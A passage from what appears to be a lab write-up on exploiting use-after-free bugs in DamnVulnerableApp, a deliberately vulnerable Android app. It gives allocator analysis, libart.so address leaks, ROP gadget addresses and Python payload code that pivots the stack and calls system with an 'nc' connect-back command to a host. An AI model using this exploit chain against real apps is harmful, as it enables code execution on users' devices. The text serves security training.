0x982a2 pointed to a global memory region that is writable, we might be able to introduce our own, totally benign implementation of malloc. Check implementation of scudo_malloc. It internally calls scudo::Allocator\u0026lt;...\u0026gt;::allocate (using c++filt to demangle mangled names). We can observe a similar behaviour for free, which winds up to call scudo::Allocator\u0026lt;scudo::AndroidConfig, \u0026amp;(scudo_malloc_postinit)\u0026gt;::deallocate(void*, scudo::Chunk::Origin, unsigned long, unsigned long).\nIntroducing Scudo, the Allocator Scudo is an allocator that is used for all native code from Android 11 onwards. Its source code can be found here .\nWe are going to take a practical approach, i.e. hunt down the functionality as quickly as possible to verify that ptrList = keyValuePair was not a coincidence. To that end, I will only present small excerpts of code.\nAs seen above , scudo_malloc calls scudo::Allocator\u0026lt;...\u0026gt;::allocate(unsigned long, scudo::Chunk::Origin, unsigned long, bool) . Analyzing the implementation reveals:\n... if (LIKELY(PrimaryT::canAllocate(NeededSize))) { ... Block = TSD-\u0026gt;Cache.allocate(ClassId); ... } ... void *Ptr = reinterpret_cast\u0026lt;void *\u0026gt;(UserPtr); void *TaggedPtr = Ptr; ... return TaggetPtr; Ptr is computed from Block, but that is irrelevant for now. Tracing TSD-\u0026gt;Cache.allocate(ClassId) gets us to the implementation we wanted to see:\nvoid *allocate(uptr ClassId) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; ... CompactPtrT CompactP = C-\u0026gt;Chunks[--C-\u0026gt;Count]; ... return Allocator-\u0026gt;decompactPtr(ClassId, CompactP); } Reversing the type definitions shows that CompactPtrT = uintptr_t, so its just a normal pointer. Finally, inspecting PerClass :\nstruct PerClass { u32 Count; // \u0026lt;-- amount of free chunks in block u32 MaxCount; // \u0026lt;-- no idea uptr ClassSize; // \u0026lt;-- size of a single chunk in bytes CompactPtrT Chunks[2 * TransferBatch::MaxNumCached]; // \u0026lt;-- chunks, freed and used }; Basically SizeClassAllocatorLocalCache::allocate(uptr ClassId) will get the next free chunk by decreasing PerClass::Count by 1 and taking this as an index into PerClass::Chunks.\nSimilarly, for scudo_free, we end up running SizeClassAllocatorLocalCache::deallocate(uptr ClassId, void *P) (this is non - trivial to see, but is what actually happens):\nvoid deallocate(uptr ClassId, void *P) { ... PerClass *C = \u0026amp;PerClassArray[ClassId]; ... C-\u0026gt;Chunks[C-\u0026gt;Count++] = Allocator-\u0026gt;compactPtr(ClassId, reinterpret_cast\u0026lt;uptr\u0026gt;(P)); ... } This method frees a chunk by writing the compacted pointer back into the array and adding 1 to PerClass::Count. Therefore, the sequence\nstruct manager *m = (struct manager*)malloc(sizeof(struct manager)); free(m); struct object *obj = (struct object*)malloc(sizeof(struct object)); results in decrementing PerClass::Count (w.r.t. corresponding class id), incrementing it and then decrementing it again while writing the same pointer. This is why we get that ptrList = keyValuePair. Notice that there are probably optimizations in place that handle memory shortages etc. As DamnVulnerableApp is the only app I run on the emulator, it might differ from what you get on a busy device.\nTrying to exploit Lets recall the setting we are in:\nWe are given a Write - What - Where condition, which allows us to write anywhere we want. It is possible to write code and data, but notice that all writable memory regions (.bss, .data, stack, heap) are not executable. We have access to libart.so, libUseAfterFreeWriteModule.so, the stack and the canary. The Goal: Arbitrary Code Execution\nSniffing out function pointers The first idea is to find a sequence of function calls, for which we have suitable control over the parameters. Redirecting the pointers of those functions by e.g. overwriting the vtable would allow to execute arbitrary functions that are resistent to __thiscall. This basically means that those functions do not use the first parameter at all or use it in a way that is beneficial to us.\nUnfortunately, vtables are located in a read - only section. This can be proven by observing that mangled vtable names start with \u0026ldquo;_ZTV\u0026rdquo;. To be precise, only \u0026ldquo;TV\u0026rdquo; indicates that this is a vtable. Next, analysing all publicly available vtables:\n$ readelf --wide --symbols libart.so | grep \u0026#34;_ZTV\u0026#34; ... 13121: 0000000000c17e18 32 OBJECT WEAK PROTECTED 16 _ZTVN3art32BuildNativeCallFrameStateMachineINS_26ComputeNativeCallFrameSizeEEE $ readelf --wide --sections libart.so ... [16] .data.rel.ro PROGBITS 0000000000c0aa40 80aa40 010b00 00 WA 0 0 16 ... Note that I might have missed a vtable, but this was enough to quit persuing the vtable - approach. If we were able to call mprotect on the vtables, maybe it could be possible to make the vtables writable. Although for this to work, we would need to find a function call that provides a virtual function with the exact parameters we need for mprotect. Therefore, __thiscall is again a challenge.\nLuckily, there are other, globally available objects that contain important function pointers. This time, the target will be to abuse the sequence of JNIEnv - function calls in a JNI function.\nObserve that, if a JNI method is called (in this module), it will be called via a generic trampoline, i.e. via artQuickGenericJniTrampoline in assembly in art_quick_generic_jni_trampoline. The first parameter is ALWAYS of type JNIEnv*. The jni object is fetched via Thread::GetJniEnv, which returns an instance of JNIEnvExt.\nclass JniEnvExt : public JNIEnv {...} ... #if defined(__cplusplus) typedef _JNIEnv JNIEnv; #else typedef const struct JNINativeInterface* JNIEnv; ... #endif ... /* * C++ object wrapper. * * This is usually overlaid on a C struct whose first element is a * JNINativeInterface*. We rely somewhat on compiler behavior. */ struct _JNIEnv { /* do not rename this; it does not seem to be entirely opaque */ const struct JNINativeInterface* functions; ... } The definition of _JNIEnv comes from here . In structures, everything is public, therefore functions is visible in JNIEnvExt!\nThen also observe that (see code )\nclass JNIEnvExt : public JNIEnv { ... static const JNINativeInterface* table_override_ ...; ... } Using\n$ readelf --wide --symbols libart.so | grep \u0026#34;_ZN3art9JNIEnvExt15table_override_E\u0026#34; 3674: 0000000000e21cb8 8 OBJECT GLOBAL PROTECTED 23 _ZN3art9JNIEnvExt15table_override_E 10840: 0000000000e21cb8 8 OBJECT GLOBAL PROTECTED 23 _ZN3art9JNIEnvExt15table_override_E $ readelf --wide --sections libart.so | grep .bss [23] .bss NOBITS 0000000000e1fbe0 81fbe0 003bb0 00 WA 0 0 16 yields that JNIEnvExt::table_override is part of .bss, which again implies that we can overwrite this pointer with the Write - What - Where condition.\nWe can try to link both of the above together via GetFunctionTable const JNINativeInterface* JNIEnvExt::GetFunctionTable(bool check_jni) { const JNINativeInterface* override = JNIEnvExt::table_override_; if (override != nullptr) { return override; } return check_jni ? GetCheckJniNativeInterface() : GetJniNativeInterface(); } and either ThreadResetFunctionTable void ThreadResetFunctionTable(Thread* thread, void* arg ATTRIBUTE_UNUSED) REQUIRES(Locks::jni_function_table_lock_) { JNIEnvExt* env = thread-\u0026gt;GetJniEnv(); bool check_jni = env-\u0026gt;IsCheckJniEnabled(); env-\u0026gt;functions = JNIEnvExt::GetFunctionTable(check_jni); env-\u0026gt;unchecked_functions_ = GetJniNativeInterface(); } or SetCheckJniEnabled void JNIEnvExt::SetCheckJniEnabled(bool enabled) { check_jni_ = enabled; MutexLock mu(Thread::Current(), *Locks::jni_function_table_lock_); functions = GetFunctionTable(enabled); // Check whether this is a no-op because of override. if (enabled \u0026amp;\u0026amp; JNIEnvExt::table_override_ != nullptr) { LOG(WARNING) \u0026lt;\u0026lt; \u0026#34;Enabling CheckJNI after a JNIEnv function table override is not functional.\u0026#34;; } } So if either of the above functions was called with a modified JNIEnvExt::override_table_, then the ART would overwrite the function table for all function calls performed via the first argument in a JNI function with pointers that we can control. An idea might be to redirect the function pointers to fitting gadgets\u0026hellip;\nNotice that ThreadResetFunctionTable is a callback invoked inside a foreach - method , i.e.\nvoid JNIEnvExt::SetTableOverride(const JNINativeInterface* table_override) { MutexLock mu(Thread::Current(), *Locks::thread_list_lock_); MutexLock mu2(Thread::Current(), *Locks::jni_function_table_lock_); JNIEnvExt::table_override_ = table_override; // See if we have a runtime. Note: we cannot run other code (like JavaVMExt\u0026#39;s CheckJNI install // code), as we\u0026#39;d have to recursively lock the mutex. Runtime* runtime = Runtime::Current(); if (runtime != nullptr) { runtime-\u0026gt;GetThreadList()-\u0026gt;ForEach(ThreadResetFunctionTable, nullptr); // Core Platform API checks rely on stack walking and classifying the caller. If a table // override is installed do not try to guess what semantics should be. runtime-\u0026gt;SetCorePlatformApiEnforcementPolicy(hiddenapi::EnforcementPolicy::kDisabled); } } which seems to be free of any references to this. Calling this function would update the function tables of every thread, which is the optimal thing to have. The big problem is that there needs to be a thread that can execute this function without crashing. If a thread crashed and took down the entire app, we would not be able to get code execution, because the JNI function would not be called. So we need a thread that is \u0026ldquo;crash - resistent\u0026rdquo;\u0026hellip; Also, in order to create a copy of that function pointer table, we would need to write at least sizeof (struct JNINativeInterface) = 0x748 bytes, i.e. roughly half a page. The probability to break the app by overwriting global variables to this extent can be assumed to be very high.\nAlternative idea for exploitation of UseAfterFreeWriteModule There is a symbol called execv in the symbol table of libart.so, whose value is 0. Thus there is a .plt entry for this function. According to an experiment, the following code runs without an error in the emulator:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { execv(\u0026#34;/bin/sh\u0026#34;, NULL); return 0; } Therefore, only the first parameter needs to be a global variable. The second one can be NULL! But we cannot trigger execution of arbitrary commands, as they would need parameters. If we were able to drop an executable file on the device, we could be able to execute this file assuming the app is granted enough permissions to access the executable.\nSeeing that the above approaches do not work or, which is more likely, are very time consuming, I decided to change the type of the vulnerability from a Write - What - Where condition to an Execute condition.\nExploitation of UseAfterFreeExecModule The issue with this module is not just the leak (which is the same as in UseAfterFreeWriteModule), but also the implementation of the key - value storage function:\n... obj = malloc(0x108); *(code **)((long)obj + 0x100) = FUN_00100c60; free(obj); keyValue = (object *)calloc(1,0x108); nameLength = (*(*env)-\u0026gt;GetArrayLength)(env,name); len = (uint)nameLength; if (0x100 \u0026lt; len) { len = 0x100; } iscopy = \u0026#39;\\0\u0026#39;; nameBytes = (*(*env)-\u0026gt;GetByteArrayElements)(env,name,\u0026amp;iscopy); __memcpy_chk(keyValue,nameBytes,len,0xffffffffffffffff); keyValue-\u0026gt;value = value; result = (char *)(**(code **)((long)obj + 0x100))(keyValue,0); resultLength = __strlen_chk(\u0026amp;result,0xffffffffffffffff); array = (*(*env)-\u0026gt;NewByteArray)(env,(jsize)resultLength); (*(*env)-\u0026gt;SetByteArrayRegion)(env,array,0,(jsize)resultLength,(jbyte *)\u0026amp;result); ... In itself, only the fact that obj is reused to call the function at obj + 0x100 seems to be an issue. Seeing that malloc(0x108) and calloc(1, 0x108) both allocate 0x108 bytes, we can deduce (just as before ) that the same chunk is returned.\nNow we just have to exploit this\u0026hellip;\nFinding a better obj + 0x100 From the first section we get a bunch of pointers. E.g. this might look like this:\n[0]: 0x730b9d3c874e \u0026lt;-- ptr: \u0026#34;amazing_key\u0026#34; [1]: 0x730b9d3c875a \u0026lt;-- ptr: \u0026#34;secret_key\u0026#34; [2]: 0x730b9d3c8740 \u0026lt;-- ptr: \u0026#34;topsecret_key\u0026#34; [3]: 0x730b9d3c8765 \u0026lt;-- ptr: \u0026#34;a_very_very_long_key_with_fancy_features_:D\u0026#34; [4]: 0x730b9afdf9a0 \u0026lt;-- stack address: most likely examples [5]: 0x2147eb93990de82b \u0026lt;-- looks more like a canary [6]: 0x730b9afdf8d0 \u0026lt;-- stack address: stored rbp [7]: 0x730c0379ffac \u0026lt;-- return address The first five addresses can be understood if one analyses lookupExamples. The canary is often just a random 8 - byte value that is pushed between a stack frame and the local variables. Depending on the canary type, this can be a terminator - canary, i.e. it contains e.g. a null - byte, or something else. On Android, it is a random canary . Disassembling lookupExamples yields\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_lookupExamples 0x0000730b9d3c8990 \u0026lt;+0\u0026gt;:\tpush rbp 0x0000730b9d3c8991 \u0026lt;+1\u0026gt;:\tmov rbp,rsp 0x0000730b9d3c8994 \u0026lt;+4\u0026gt;:\tsub rsp,0x70 0x0000730b9d3c8998 \u0026lt;+8\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000730b9d3c89a1 \u0026lt;+17\u0026gt;:\tmov QWORD PTR [rbp-0x8],rax ... and therefore the stack layout is as described above.\nThe problem is that we want to execute e.g. execve or similar, but this function is not referenced in the module itself. This is where the return address comes into play. On my machine, art_quick_generic_jni_trampoline is the function that calls lookupExamples. This may depend on, among other things, the way the function is specified in the java code, i.e. it could be static or non - static. In this case, the return address is art_quick_generic_jni_trampoline+220.\nRunning\n$ readelf --wide --symbols libart.so | grep art_quick_generic_jni_trampoline 7145: 000000000039fed0 378 FUNC LOCAL HIDDEN 14 art_quick_generic_jni_trampoline gives the offset 0x39fed0. Thus, the base address (mind ASLR) of libart.so is\n0x730c0379ffac - 220 - 0x39fed0 = 0x730c03400000 From now on, all code in libart.so is also available to us. Remember that we can overwrite a function pointer, whose function is called with two parameters\nkeyValue: pointer to a user - controlled string \u0026lt;unknown\u0026gt;: NULL We could gamble and hope that execve works here, but most likely it will not. We again do not control enough parameters. Notice that looking for similar functions yields\n$ readelf --wide --symbols libart.so | grep \u0026#34;exec\u0026#34; 199: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execv@LIBC (2) 200: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve@LIBC (2) 271: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi 1304: 0000000000000000 0 FILE LOCAL DEFAULT ABS exec_utils.cc 8795: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execv 8796: 0000000000000000 0 FUNC GLOBAL DEFAULT UND execve 10033: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _ZN3art10DupCloexecEi Looking up execv reveals\nint execv(const char *pathname, char *const argv[]); This time, lets try to at least get to the point where we can execute an arbitrary executable file that we provided, as is described in a previous section .\nThe attentive reader might have noticed that execv does not have any offset, i.e. an offset of 0. Thus it will be resolved when the dynamic linker loads libart.so. To solve that issue, we just have to figure out to which location a call to execv transfers control. Introducing: .plt!\nOne way to find the offset and thus the address of execv is to search for calls of execv in the binary. It turns out that ExecWithoutWait calls execv. Disassembling it yields:\n$ readelf --wide --symbols libart.so | grep ExecWithoutWait 1305: 00000000004b6ac0 560 FUNC LOCAL DEFAULT 14 _ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE gef➤ disassemble 0x4b6ac0 + 0x730c03400000 ... 0x0000730c038b6bf8 \u0026lt;+312\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x20] 0x0000730c038b6bfd \u0026lt;+317\u0026gt;:\tmov rdi,r14 0x0000730c038b6c00 \u0026lt;+320\u0026gt;:\tcall 0x730c03e08f80 \u0026lt;--- symbol stub for execv 0x0000730c038b6c05 \u0026lt;+325\u0026gt;:\tjmp 0x730c038b6c14 \u0026lt;_ZN3art12_GLOBAL__N_115ExecWithoutWaitERNSt3__16vectorINS1_12basic_stringIcNS1_11char_traitsIcEENS1_9allocatorIcEEEENS6_IS8_EEEE+340\u0026gt; ... As we know the base address of libart.so, we can compute 0x730c03e08f80 - 0x730c03400000 = 0xa08f80. If we uploaded a test client shell script that connects to 10.0.2.2:4444, chose key = \u0026quot;/data/local/tmp/client\u0026quot; and value=\u0026lt;address of execv\u0026gt;, we would expect to get a connection\u0026hellip;but unfortunately, execution gets denied with an error:\n/com.damnvulnerableapp W/Thread-2: type=1400 audit(0.0:3799): avc: denied { execute } for name=\u0026#34;client\u0026#34; dev=\u0026#34;dm-5\u0026#34; ino=65602 scontext=u:r:untrusted_app:s0:c152,c256,c512,c768 tcontext=u:object_r:shell_data_file:s0 tclass=file permissive=0 app=com.damnvulnerableapp Trying to earn all the fruits As you may have noticed, the above does not really help other than crashing the app. What we want is arbitrary code execution!!! Thus, we can try to transform the above UAF vulnerability into another vulnerability, e.g. a format string vulnerability that is easier to exploit!\nObserve that there is a function called StringPrintf :\nstd::string StringPrintf(const char* fmt, ...) { va_list ap; va_start(ap, fmt); std::string result; StringAppendV(\u0026amp;result, fmt, ap); va_end(ap); return result; } which is a perfect target as we fully control the content of key! Using the same trick as above or by just disassembling the whole .plt and searching for StringPrintf will reveal that its offset is 0xa08570 (in .plt). Notice that StringPrintf internally calls StringAppendV, which again calls vsnprintf.\nTherefore, set key=\u0026lt;format string\u0026gt; and value=address of StringPrintf@plt.\nTesting this reveals that we might be able to use format strings like \u0026ldquo;%4242x\u0026rdquo;, but not \u0026ldquo;%4242x%n\u0026rdquo;, because of the implementation of vfprintf :\n... case \u0026#39;n\u0026#39;: __fortify_fatal(\u0026#34;%%n not allowed on Android\u0026#34;); ... Also, for the above to work, we would need to adjust the call to obj + 0x100 like:\nchar buffer[32] = { 0 }; *(obj + 0x100)(buffer, keyValue); because StringPrintf silently assumes that rdi is an address to a variable that has to store a result of 24 bytes and rsi is the format string. If we did not make the above change, then StringPrintf would zero out the first 24 bytes of our format string, thus completely shutting down the attack. Adding to the pile, we do not have any control over addresses that are accessible via direct parameter access. To be precise, we would need to be lucky enough to find any addresses of interest on the stack like e.g. the format string itself.\nAnother idea could be to call dlopen to get a reference to another library that provides more interesting functionality like system! The offset of the .plt - entry that calls dlopen is 0xa096b0. Thus we can compute the overall virtual address. Unfortunately, this is shut down by the fact that dlopen returns a random 8 - byte value that is a key into a dictionary, whose values are the actual addresses of soinfo - structures, which again contain the base addresses. So it is pretty unlikely to get this right, the best we could do here is either guessing or trying to leak the dictionary via a global variable.\nFinally: the solution Another approach is to try to exploit this UAF vulnerability via a ROP - chain. This is a very destructive approach, but lets see through this:\nFind a gadget that, right before the call of our obj + 0x100 function, modifies the stack in such a way that it will return to keyValue. Put ROP - chain into keyValue. We may use at most 256 // 8 = 32 qwords. This might be sufficient to leak a libc.so address into a global variable in libart.so. It will turn out that this even suffices to get arbitrary, limited - length command execution. Finally restore the old rsp and rbp. This would be necessary for a stealthy approach. Restoring rsp is only really important for calling system, because if rsp points into keyValue, which is located on the heap, system will allocate alot of memory from the heap as if it was a stack, therefore going out-of-bounds fast. So, the gadget of choice is located at 0x39509a and is of the form:\ngef➤ x/10i 0x730c03400000 + 0x39509a 0x730c0379509a \u0026lt;art_quick_do_long_jump+106\u0026gt;:\tpop rdi 0x730c0379509b \u0026lt;art_quick_do_long_jump+107\u0026gt;:\tpop rsi 0x730c0379509c \u0026lt;art_quick_do_long_jump+108\u0026gt;:\tpop rbp 0x730c0379509d \u0026lt;art_quick_do_long_jump+109\u0026gt;:\tadd rsp,0x8 0x730c037950a1 \u0026lt;art_quick_do_long_jump+113\u0026gt;:\tpop rbx 0x730c037950a2 \u0026lt;art_quick_do_long_jump+114\u0026gt;:\tpop rdx 0x730c037950a3 \u0026lt;art_quick_do_long_jump+115\u0026gt;:\tpop rcx 0x730c037950a4 \u0026lt;art_quick_do_long_jump+116\u0026gt;:\tpop rax 0x730c037950a5 \u0026lt;art_quick_do_long_jump+117\u0026gt;:\tpop rsp 0x730c037950a6 \u0026lt;art_quick_do_long_jump+118\u0026gt;:\tret We can use the debugger to figure out how many qwords we need to pop in order for the ret - instruction to return to keyValue:\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeExecModule_storePair ... 0x0000730b9d3c8b5c \u0026lt;+252\u0026gt;:\tmov rax,QWORD PTR [rbp-0x70] 0x0000730b9d3c8b60 \u0026lt;+256\u0026gt;:\tmov rax,QWORD PTR [rax+0x100] 0x0000730b9d3c8b67 \u0026lt;+263\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x78] \u0026lt;--- keyValue 0x0000730b9d3c8b6b \u0026lt;+267\u0026gt;:\txor ecx,ecx 0x0000730b9d3c8b6d \u0026lt;+269\u0026gt;:\tmov DWORD PTR [rbp-0xac],ecx 0x0000730b9d3c8b73 \u0026lt;+275\u0026gt;:\tmov esi,ecx =\u0026gt; 0x0000730b9d3c8b75 \u0026lt;+277\u0026gt;:\tcall rax \u0026lt;--- execution condition ... gef➤ x/1gx $rbp-0x78 0x730b9afdf818:\t0x0000730cb77bb950 gef➤ x/10gx $rsp 0x730b9afdf7e0:\t0x00000000990de82b\t0x0000730d778087d0 0x730b9afdf7f0:\t0x0000730b9afdfb00\t0x0000730d77808880 0x730b9afdf800:\t0x0000730b9afdfd60\t0x0000730ca77f2750 0x730b9afdf810:\t0x000000d09afdf8b0\t0x0000730cb77bb950 \u0026lt;--- this is keyValue 0x730b9afdf820:\t0x0000730cb77bb950\t0x0000730c0379509c So when we run into call rax, we push an additional return address onto the stack. Therefore we need to pop 1 + 7 qwords from the stack before we can shift the stack into keyValue and hit ret. So we need rsp to be keyValue, then the stack \u0026ldquo;changes\u0026rdquo; to our controlled ROP - chain. Therefore we can make use the Execute condition to run the above gadget, which will then trigger execution of the gadgets located in keyValue.\nNow we will try to leak a libc.so address into a global variable in libart.so. This allows us to compute the libc.so base address, which in turn allows us to call system (the holy grail)! To that end, we will try to find a libc.so address in libart.so. The .got.plt is the best place to start looking. As Android\u0026rsquo;s dynamic linker likes loading shared objects with BIND_NOW (which is probably motivated by RELRO), the .got.plt is already populated with the correct function addresses. This implies that the .got.plt entry of _exit contains the actual address of _exit in the libc.so. Computing the offset of _exit\u0026rsquo;s .got.plt entry yields 0xc1be50 (we could use any other function from libc.so; _exit was chosen arbitrarily).\nObserve that we only need 6 qwords to leak system:\n# Leak exit@libc into rax payload += gadget_pop_rdi payload += address_got_plt_exit payload += gadget_mov_rax_deref_rdi # Put system@libc into rax payload += gadget_pop_rcx payload += p64(offset__exit - offset_system) # --\u0026gt; offset__exit \u0026gt;= offset_system (just testing) payload += gadget_sub_rax_rcx After the above, rax will contain the address of system@libc. Setting up the command to execute can be done by writing to a writable memory area in libart.so (hope that this does not crash; otherwise choose another area until it works). Writing the command could look like this:\npayload += gadget_pop_rdi payload += address_writable_memory payload += gadget_pop_rcx payload += b\u0026#39;nc 10.0.\u0026#39; payload += gadget_mov_deref_rdi_rcx Finally, we want to call system@libc, whose address is stored in rax. The main problem here is that just calling system will most likely crash the app, because rsp still points into the heap. If system uses a lot of stack memory, this will eventually invalidate heap chunks or trigger anti - out - of - bounds security mechanisms. Therefore, we need to restore rsp s.t. it points into a sufficiently large memory area that is assumed to be used by \u0026ldquo;user - code\u0026rdquo;, i.e. e.g. the original stack. Observe that the leaked addresses contained a stack pointer. We can go ahead and write the address of system@libc into that address and then restore the stack with a pop rsp; ret:\n# Write address of system@got.plt to stack address. rdi currently contains the command string! payload += gadget_pop_rcx payload += address_stack payload += gadget_mov_deref_rcx_rax # \u0026lt;-- rax = system@libc # Restore stack. This gadget implicitly calls system payload += gadget_pop_rsp payload += address_stack This exploit is very specific to this module, but it uses a technique that shifts the stack into a user - controlled memory region s.t. successive ret - instructions result in execution of ROP - gadgets.\nComing back from UseAfterFreeExecModule The technique used to exploit the UAF vulnerability in the UseAfterFreeExecModule might be applicable to libUseAfterFreeWriteModule aswell. General steps are:\nSetup a ROP - chain in readable/writeable memory area. In this case, this will be in a shared memory region somewhere is libart.so. Next, overwrite rsp to point to the above mentioned memory region. Then immediately return using ret. Enjoy the ROP - chain It turns out that this does not work by itself. As we can only write one qword in each function call, we can either overwrite the return address to trigger execution of e.g. a gadget or set the stack pointer, but not both at once. Therefore, we need to do a little magic to make things work.\nThe key observation is that rbp is often used to restore rsp in function epilogues. This is precisely what happens in the caller of storePair! See the following assembly of storePair:\ngef➤ disassemble Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair ... 0x0000730b9ed59abd \u0026lt;+205\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x50] 0x0000730b9ed59ac1 \u0026lt;+209\u0026gt;:\tmov rax,QWORD PTR [rbp-0x58] 0x0000730b9ed59ac5 \u0026lt;+213\u0026gt;:\tmov rax,QWORD PTR [rax] 0x0000730b9ed59ac8 \u0026lt;+216\u0026gt;:\tmov QWORD PTR [rax],rcx \u0026lt;--- write - what - where condition 0x0000730b9ed59acb \u0026lt;+219\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x38] 0x0000730b9ed59acf \u0026lt;+223\u0026gt;:\tmov rax,QWORD PTR [rdi] 0x0000730b9ed59ad2 \u0026lt;+226\u0026gt;:\tmov rax,QWORD PTR [rax+0x600] 0x0000730b9ed59ad9 \u0026lt;+233\u0026gt;:\tmov rsi,QWORD PTR [rbp-0x48] 0x0000730b9ed59add \u0026lt;+237\u0026gt;:\tmov rdx,QWORD PTR [rbp-0x70] 0x0000730b9ed59ae1 \u0026lt;+241\u0026gt;:\tmov ecx,0x2 0x0000730b9ed59ae6 \u0026lt;+246\u0026gt;:\tcall rax 0x0000730b9ed59ae8 \u0026lt;+248\u0026gt;:\tmov rdi,QWORD PTR [rbp-0x60] 0x0000730b9ed59aec \u0026lt;+252\u0026gt;:\tcall 0x730b9ed59b90 \u0026lt;free@plt\u0026gt; 0x0000730b9ed59af1 \u0026lt;+257\u0026gt;:\tmov rax,QWORD PTR fs:0x28 0x0000730b9ed59afa \u0026lt;+266\u0026gt;:\tmov rcx,QWORD PTR [rbp-0x8] 0x0000730b9ed59afe \u0026lt;+270\u0026gt;:\tcmp rax,rcx 0x0000730b9ed59b01 \u0026lt;+273\u0026gt;:\tjne 0x730b9ed59b0d \u0026lt;Java_com_damnvulnerableapp_vulnerable_modules_UseAfterFreeWriteModule_storePair+285\u0026gt; 0x0000730b9ed59b07 \u0026lt;+279\u0026gt;:\tadd rsp,0x70 0x0000730b9ed59b0b \u0026lt;+283\u0026gt;:\tpop rbp \u0026lt;--- restore old rbp of calling function 0x0000730b9ed59b0c \u0026lt;+284\u0026gt;:\tret It is clear that in between the Write - What - Where condition and the pop rbp - instruction there are no references to the stored old rbp of the calling function. Therefore, we can \u0026ldquo;safely\u0026rdquo; overwrite it. But why would we do this? Consider what happens after we return from storePair:\ngef➤ x/35i 0x0000730c0379ffa9 0x730c0379ffa9:\tcall r11 0x730c0379ffac:\tmov rdi,QWORD PTR gs:0xe0 \u0026lt;--- we return here 0x730c0379ffb5:\tmov rsi,rax 0x730c0379ffb8:\tmovq rdx,xmm0 0x730c0379ffbd:\tcall 0x730c03d62b00 \u0026lt;artInvokeInterfaceTrampolineWithAccessCheck+208\u0026gt; 0x730c0379ffc2:\tmov rcx,QWORD PTR gs:0xa0 0x730c0379ffcb:\ttest rcx,rcx 0x730c0379ffce:\tjne 0x730c037a0034 \u0026lt;art_quick_read_barrier_mark_reg02+116\u0026gt; 0x730c0379ffd0:\tmov rsp,rbp \u0026lt;--- how convenient! 0x730c0379ffd3:\tmovq xmm1,QWORD PTR [rsp+0x18] 0x730c0379ffd9:\tmovq xmm2,QWORD PTR [rsp+0x20] 0x730c0379ffdf:\tmovq xmm3,QWORD PTR [rsp+0x28] 0x730c0379ffe5:\tmovq xmm4,QWORD PTR [rsp+0x30] 0x730c0379ffeb:\tmovq xmm5,QWORD PTR [rsp+0x38] 0x730c0379fff1:\tmovq xmm6,QWORD PTR [rsp+0x40] 0x730c0379fff7:\tmovq xmm7,QWORD PTR [rsp+0x48] 0x730c0379fffd:\tmovq xmm12,QWORD PTR [rsp+0x50] 0x730c037a0004:\tmovq xmm13,QWORD PTR [rsp+0x58] 0x730c037a000b:\tmovq xmm14,QWORD PTR [rsp+0x60] 0x730c037a0012:\tmovq xmm15,QWORD PTR [rsp+0x68] 0x730c037a0019:\tadd rsp,0x70 0x730c037a001d:\tpop rcx 0x730c037a001e:\tpop rdx 0x730c037a001f:\tpop rbx 0x730c037a0020:\tpop rbp 0x730c037a0021:\tpop rsi 0x730c037a0022:\tpop r8 0x730c037a0024:\tpop r9 0x730c037a0026:\tpop r12 0x730c037a0028:\tpop r13 0x730c037a002a:\tpop r14 0x730c037a002c:\tpop r15 0x730c037a002e:\tmovq xmm0,rax 0x730c037a0033:\tret So if we were to pass the function call call 0x730c03d62b00 and rcx = 0, then we reach mov rsp, rbp, where rbp can be a value of our choice if we decide to overwrite the old rbp! After rsp has been set, we can see that we have a lot of references to rsp in order to restore the registers. So in addition to our ROP - chain, we need to ensure that there is a region of size 0x70 + 11 * 0x8 of accessible memory. The content of the accessible memory region can be anything, although we could use it to make an initial setup for the registers. Right after that region, we can place our ROP - chain, as rsp will point to rbp + 0x70 + 11 * 0x8 = rbp + 0xc8. Once we hit the ROP - chain, we can continue as usual in order to set up a command for system etc.\nOnce we want to call system we need to restore the stack in order to make segmentation faults etc. less likely (remember that rsp is currently pointing to some globally accessible memory region, e.g. .bss. We do not want our stack to be there forever!). To that end we write the address of system to the stack pointer that was leaked by lookupExamples, set rsp to that address and call pop rsp; ret:\n# Up to this point, rsp still points into .bss! This will most likely crash the app while calling system! Thus try to reset rsp by abusing the stack pointer leak. We will set rsp to the leaked address, but before we will set the stack value at that leaked address to system@libc! Thus we can use a pop rsp; ret gadget. # Write address of system@got.plt to stack address. rdi currently contains the command string! payload += gadget_pop_rcx payload += address_stack payload += gadget_mov_deref_rcx_rax # Restore stack payload += gadget_pop_rsp payload += address_stack There is only one problem remaining, i.e. when monitoring the exploit with gdb, we can observe that the ROP - chain might execute perfectly fine. But if we try to run the exploit without any debugger attached, it most likely does not work (at least in my case). There may be multiple reasons for that, among which the most probable ones are:\ngdb shifts the stack, because it stores debug information or similar gdb prevents the app from using certain global variables s.t. overwriting them with gdb attached results in no error. It turns out that the first hypothesis is most likely true! To that end, we can try to brute - force over a finite set of possible stack shifts like so:\naddress_old_rbp = p64(u64(leak[4]) - 0x240 + 0x8 * (rbp_shift)) where\nleak[4] is the stack address leak - 0x240 is the offset of the leaked stack address to the address of the old rbp when gdb is attached + 0x8 * rbp_shift shift to try for this run of the exploit. As we are \u0026ldquo;missing\u0026rdquo; gdb, it is very probable that there is less data on the stack, thus we increment the stack address. A big problem could be that both of the above reasons are true. Thus, minizing the ROP - chain we write into global memory can be very helpful to rule out the second reason as much as possible. E.g. we could use a ROP - chain that just calls sleep(42). Then brute - force over all shifts until the app blocks. The shift that caused a block (longer than usual execution times, i.e. it might not block for all 42 seconds, because other threads might try to use overwritten global variables, which probably crashes the app!) is most likely the shift we were looking for.\nSummary It has been a long journey to get to arbitrary code execution, but in 